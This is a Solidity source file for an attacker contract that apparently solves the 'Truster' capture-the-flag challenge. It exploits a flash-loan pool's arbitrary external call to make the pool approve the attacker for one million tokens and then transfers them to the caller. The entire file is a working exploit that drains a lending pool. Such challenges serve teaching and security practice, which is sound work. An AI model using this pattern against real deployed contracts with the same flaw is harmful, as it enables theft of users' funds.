// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../truster/TrusterLenderPool.sol";

/**
 * @title Attacker
 * @author kyrers
 * @notice This contract just performs the attack for us. Instead of us sending the two transactions needed, we just call attack
 */

contract TrusterAttacker {

    IERC20 public immutable token;
    TrusterLenderPool private immutable pool;

    constructor(address _pool, address  _token) {
        pool = TrusterLenderPool(_pool);
        token = IERC20(_token);
    }

    function attack() public {
        pool.flashLoan(0, address(this), address(token), abi.encodeWithSignature("approve(address,uint256)", address(this), 1000000 ether));
        token.transferFrom(address(pool), msg.sender, 1000000 ether);
    }
}
